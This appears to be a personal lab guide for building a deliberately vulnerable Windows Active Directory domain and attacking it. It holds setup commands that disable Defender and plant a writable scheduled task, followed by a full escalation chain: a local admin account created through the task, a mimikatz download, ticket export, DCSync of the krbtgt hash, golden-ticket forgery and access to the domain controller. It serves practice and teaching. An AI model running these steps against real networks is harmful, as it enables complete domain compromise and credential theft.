## Enviorment ##
Domain:
goldencheezburger.com

#Network
10.20.30.0/24

#Machines
golden-dc-01 / 10.20.30.40 / 62.181.196.215:2222 (domain controller)
golden-cl-01 / 10.20.30.42 / 62.181.196.215:2223 (domain client)
golden-cl-02 / 10.20.30.43 / 62.181.196.215:2224 (domain client)

#Users
Administrator (domain admin)
admin (domain admin)
user (domain user)
Administrator (local golden-cl-01)

#Access
RDP
WinRM

#Tools
Mimikazt
Mstsc

#Goal
Local PrivEsc
Domain PrivEsc
Golden Ticket

#Scenario
1) Gain access as user
2) Local PrivEsc via schedueld task running as golden-cl-01\Administrator
3) Domain PrivEsc via loggd on user goldencheezburger\
4) Dump krbtgt NTLM hash
5) Issue ticket for Administrator
6) Brows fileshare on golden-dc-01

## Deploy domain ##
#Set IP address
New-NetIPAddress -InterfaceIndex (Get-NetAdapter).ifIndex -IPAddress 10.20.30.40 -PrefixLength 24 -DefaultGateway 10.20.30.1

#Install domain services
Add-WindowsFeature AD-Domain-Services

#Install forest
Install-ADDSForest
-DomainName "goldencheezburger.com" -CreateDnsDelegation:$false -DatabasePath "C:\Windows\NTDS" -DomainMode "7" -DomainNetbiosName "goldencheez" -ForestMode "7" -InstallDns:$true -LogPath "C:\Windows\NTDS" -NoRebootOnCompletion:$True -SysvolPath "C:\Windows\SYSVOL" -Force:$true

#Check services
Get-Service adws,kdc,netlogon,dns

#Add users account to domain
New-ADUser -Name "admin" -PasswordNeverExpires $true -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText -String '****' -Force)
New-ADUser -Name "user" -PasswordNeverExpires $true -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText -String '****' -Force)

#Add user account to group
Add-ADGroupMember -Identity "Domain Admins" -Members admin

#Add computer account to domain
New-ADComputer -Name "golden-cl-01" -SamAccountName "golden-cl-01"

#Disable Windows Defender and Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend

## Deploy client ##
#Set IP address
New-NetIPAddress -InterfaceIndex (Get-NetAdapter).ifIndex -IPAddress 10.20.30.42 -PrefixLength 24 -DefaultGateway 10.20.30.1
Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).ifIndex -ServerAddresses ("10.20.30.40")

#Add client to domain
Add-computer –domainname "goldencheezburger.com" -restart

#Set execution policy for client
Set-ExecutionPolicy unrestricted -Scope LocalMachine

#Create folder and ps1 file
New-Item -Path 'C:\temp' -ItemType Directory
New-Item -Path 'C:\temp\cheez.ps1' -ItemType File

#Set Acl on folder
$acl = Get-Acl "c:\temp"
$ar = New-Object System.Security.AccessControl.FileSystemAccessRule("user", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")

$acl.SetAccessRule($ar)
Set-Acl "c:\temp" $acl

#Create schedueld task
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "c:\temp\cheez.ps1"'
$trigger = New-ScheduledTaskTrigger -Once -At 7am -RepetitionDuration (New-TimeSpan -Days 1) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Cheez" -Description "Cheez burger delivery" -User "$env:USERDOMAIN\$env:USERNAME" -Password '*****'

#Allow Domain Users to access client via RDP
Add-LocalGroupMember -Group "Remote Desktop Users" "goldencheez\Domain Users"

#Disable Windows Defender and Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend

## Exploite ##
#Logon as admin via RDP
#Logon as user via RDP
#Exeute below as user
Add to cheez.ps1
New-LocalUser "cheez" -Password (ConvertTo-SecureString -AsPlainText -String '****' -Force)
Add-LocalGroupMember -Group "Administrators" -Member "cheez"

#Logon as cheez (Exeute below as cheez)
runas /user:cheez powershell.exe

#Download mimikatz
#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "mimikatz_trunk.zip"

#Unzip mimikatz
Expand-Archive 'mimikatz_trunk.zip'

#Dump tickets for admin
privilege::debug
sekurlsa::tickets /export
kerberos::ptt [0;xxx]xxxxx.kirbi

#Grab domain sid and NTLM hash for krbtgt
lsadump::dcsync /domain:goldencheezburger.com /all /user:krbtgt
Kerberos::golden /user:Administrator /domain:goldencheezburger.com /sid:[domain_sid] /krbtgt:[ntlm_hash] /id:500 

#Set ticket (might need to pruge olde tickets first)
kerberos::ptt ticket.kirbi

#Start shell with Golden ticket
misc::cmd

#List tickets
klist

#Check current user
whoami

#Browse dc c$
dir \\golden-dc-01\c$

#Install powershell remote tools
Get-WindowsFeature –Name RSAT*
ADD-WindowsFeature RSAT-Role-Tools
